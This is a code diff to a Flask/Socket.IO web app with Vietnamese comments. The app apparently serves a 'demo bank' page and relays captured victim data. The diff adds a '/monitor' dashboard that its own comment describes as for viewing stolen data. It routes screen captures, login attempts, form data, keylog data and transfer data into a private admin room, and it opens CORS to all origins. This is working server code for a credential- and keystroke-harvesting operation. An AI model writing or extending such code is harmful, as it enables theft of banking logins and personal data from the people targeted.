@@ -125,6 +125,11 @@ def bank():
     """Giao diện ngân hàng demo với monitoring"""
     return render_template('bank.html')
 
+@app.route('/monitor')
+def monitor():
+    """Admin monitoring dashboard - Xem dữ liệu bị đánh cắp"""
+    return render_template('monitor.html')
+
 @app.route('/upgrade')
 @login_required
 def upgrade():
@@ -295,23 +300,29 @@ def health_check():
 # Socket.IO events for bank monitoring
 @socketio.on('screen-capture')
 def handle_screen_capture(data):
-    emit('screen-capture', data, broadcast=True, include_self=False)
+    emit('screen-capture', data, broadcast=True, include_self=False, room='admin-room')
 
 @socketio.on('login-attempt')
 def handle_login_attempt(data):
-    emit('login-attempt', data, broadcast=True, include_self=False)
+    emit('login-attempt', data, broadcast=True, include_self=False, room='admin-room')
 
 @socketio.on('form-data')
 def handle_form_data(data):
-    emit('form-data', data, broadcast=True, include_self=False)
+    emit('form-data', data, broadcast=True, include_self=False, room='admin-room')
 
 @socketio.on('keylog-data')
 def handle_keylog_data(data):
-    emit('keylog-data', data, broadcast=True, include_self=False)
+    emit('keylog-data', data, broadcast=True, include_self=False, room='admin-room')
 
 @socketio.on('transfer-data')
 def handle_transfer_data(data):
-    emit('transfer-data', data, broadcast=True, include_self=False)
+    emit('transfer-data', data, broadcast=True, include_self=False, room='admin-room')
+
+@socketio.on('join-admin')
+def handle_join_admin():
+    from flask_socketio import join_room
+    join_room('admin-room')
+    emit('admin-joined', {'status': 'success'})
 
 if __name__ == '__main__':
     # Render configuration
@@ -320,5 +331,6 @@ if __name__ == '__main__':
         app,
         host='0.0.0.0',
         port=port,
-        debug=False
+        debug=False,
+        cors_allowed_origins='*'
     )
